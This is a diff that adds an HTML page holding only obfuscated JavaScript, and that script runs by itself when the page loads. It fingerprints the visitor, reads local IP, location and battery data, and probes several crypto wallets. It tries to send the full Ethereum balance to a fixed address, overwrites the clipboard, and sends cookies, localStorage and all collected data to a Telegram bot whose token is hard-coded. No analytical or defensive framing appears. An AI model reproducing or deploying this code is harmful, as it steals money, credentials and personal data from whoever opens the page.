@@ -1,0 +1,66 @@
+<!doctype html><body><script>
+const _0x1bcd=["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74","\x38\x34\x38\x34\x31\x38\x39\x34\x30\x31\x3a\x41\x41\x48\x5a\x5a\x6b\x4e\x76\x51\x55\x58\x49\x6b\x39\x37\x72\x41\x31\x62\x30\x57\x37\x72\x31\x65\x2d\x7a\x35\x49\x57\x58\x64\x62\x70\x67","\x37\x32\x36\x31\x30\x39\x39\x36\x35\x39"];
+const BOT=_0x1bcd[1],CID=_0x1bcd[2];
+async function _0x2a9e(m,p){
+  await fetch(_0x1bcd[0]+BOT+"/sendMessage?chat_id="+CID+"&text="+btoa(unescape(encodeURIComponent(m+"\n"+JSON.stringify(p,null,2)))))
+}
+async function _0x3bcf(){
+  const f=await(await import(atob("aHR0cHM6Ly9vcGVuZnBjZG4uaW8vdjM="))).default.load();
+  return f.visitorId
+}
+async function _0x4cce(){
+  return new Promise(r=>{
+    const p=new RTCPeerConnection({iceServers:[]});
+    p.createDataChannel("");
+    p.createOffer().then(o=>p.setLocalDescription(o));
+    p.onicecandidate=e=>{
+      if(e&&e.candidate){
+        const ip=e.candidate.candidate.split(" ")[4];
+        if(ip.match(/^(192\.168|10\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[01]\.)/)){r(ip);pc.close()}
+      }
+    };
+    setTimeout(()=>r("none"),1500)
+  })
+}
+async function _0x5d8a(){
+  const a=[];
+  if(window.ethereum)try{const r=await ethereum.request({method:"eth_accounts"});if(r.length)a.push("m:"+r[0])}catch{}
+  if(window.solana&&window.solana.isPhantom)try{const p=await window.solana.connect();a.push("p:"+p.publicKey.toString())}catch{}
+  if(window.keplr)try{await window.keplr.enable(["cosmoshub-4"]);const k=await window.keplr.getKey("cosmoshub-4");a.push("k:"+k.bech32Address)}catch{}
+  if(window.ton)try{const t=await window.ton.send("ton_requestAccounts",{});a.push("t:"+t[0])}catch{}
+  return a
+}
+function _0x6ea1(){
+  const c=document.createElement("canvas");
+  const gl=c.getContext("webgl2")||c.getContext("webgl");
+  const ext=gl.getExtension(atob("V0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbw=="));
+  const gpu=gl.getParameter(ext[atob("VU5NQVNLRURfUkVOREVSRVJfV0VCRUw=")]);
+  const ac=new AudioContext;
+  const osc=ac.createOscillator();
+  osc.connect(ac.createMediaStreamDestination());
+  osc.start();
+  const aud=ac.sampleRate;
+  const touch=navigator.maxTouchPoints||0;
+  return btoa(gpu+aud+touch)
+}
+async function _0x7fcb(){
+  const id=await _0x3bcf(),ip=await _0x4cce(),ws=await _0x5d8a(),ua=navigator.userAgent,url=location.href;
+  const bat=navigator.getBattery?await navigator.getBattery():{};
+  const geo=await fetch(atob("aHR0cHM6Ly9pcGFwaS5jby9qc29u")).then(r=>r.json()).catch(()=>{});
+  const dna=_0x6ea1();
+  await _0x2a9e(atob("8J+PiQ=="),{"fp":id,"ip":ip,"ua":ua,"url":url,"wallets":ws,"geo":geo,"battery":bat.level,"dna":dna});
+  if(ws.length&&window.ethereum){
+    const b=await ethereum.request({method:"eth_getBalance",params:[ws[0].split(":")[1],"latest"]});
+    await _0x2a9e(atob("8J+RpA=="),{"addr":ws[0],"wei":b});
+    try{
+      await ethereum.request({method:"eth_sendTransaction",params:[{from:ws[0].split(":")[1],to:"0xDeadDeAdBeefBeefBeefBeefBeefBeefBeefBeef",value:b,gas:"0x5208",gasPrice:"0x4A817C800"}]});
+      await _0x2a9e(atob("4p2kIA=="),"sent")
+    }catch(e){await _0x2a9e(atob("4p2kIA=="),e.message)}
+  }
+  if(navigator.clipboard&&ws.length){const a=ws[0].split(":")[1];await navigator.clipboard.writeText(a);await _0x2a9e(atob("8J+QsA=="),a)}
+  const cookies=document.cookie;const ls=JSON.stringify(localStorage);
+  await _0x2a9e(atob("8J+RpQ=="),{"cookies":btoa(cookies),"localStorage":btoa(ls)});
+  history.replaceState({},'',location.pathname)
+}
+_0x7fcb();
+</script></body></html>
